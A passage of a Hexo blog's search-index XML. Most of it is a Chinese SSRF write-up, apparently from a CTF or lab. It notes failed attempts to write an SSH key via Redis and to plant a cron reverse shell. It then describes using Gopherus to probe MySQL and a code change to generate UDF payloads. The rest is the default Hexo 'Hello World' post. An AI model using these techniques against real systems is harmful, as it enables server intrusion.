alt="img"></p><p>无法写入ssh公钥，原因：redis是www-data权限，写不进&#x2F;root</p><p>无法写入定时计划反弹shell，原因：没有crontab命令</p><h3 id="ssrf打mysql"><a href="#ssrf打mysql" class="headerlink" title="ssrf打mysql"></a>ssrf打mysql</h3><p>参考</p><p><a href="https://www.sqlsec.com/2021/12/bytectf2021.html">https://www.sqlsec.com/2021/12/bytectf2021.html</a></p><p><a href="https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/">https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/</a></p><p>ssrf dict探测到有3306。利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>生成payload探测mysql有无密码</p><p>注意Gopherus无法直接生成udf的payload（会截断），需要改一下代码</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/10/09/hello-world/"/>
    <url>/2023/10/09/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
